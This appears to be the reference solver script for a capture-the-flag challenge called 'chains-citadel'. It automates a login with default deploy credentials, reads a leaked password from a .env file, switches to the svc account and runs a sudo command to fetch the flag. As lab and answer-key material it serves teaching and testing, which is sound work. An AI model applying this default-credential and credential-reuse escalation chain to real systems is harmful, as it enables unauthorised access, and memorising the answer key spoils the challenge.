#!/usr/bin/env python3
"""Reference solver for chains-citadel.

Foothold with default deploy creds -> read the leaked reused svc password ->
su to svc -> sudo flagtool as root.

    python3 solve.py http://HOST:PORT
"""
import json
import re
import sys
import urllib.request


def _req(url, obj=None, headers=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    h = dict(headers or {})
    if data:
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    tok = _req(base + "/login", {"user": "deploy", "pass": "deploy"}, method="POST")[
        "token"
    ]
    env = _req(base + "/read?path=/home/deploy/.env", headers={"X-Token": tok})["body"]
    pw = re.search(r"svc_password=(\S+)", env).group(1)
    svc = _req(base + "/su", {"user": "svc", "password": pw}, method="POST")["token"]
    return _req(base + "/sudo?cmd=flagtool", headers={"X-Token": svc})["output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
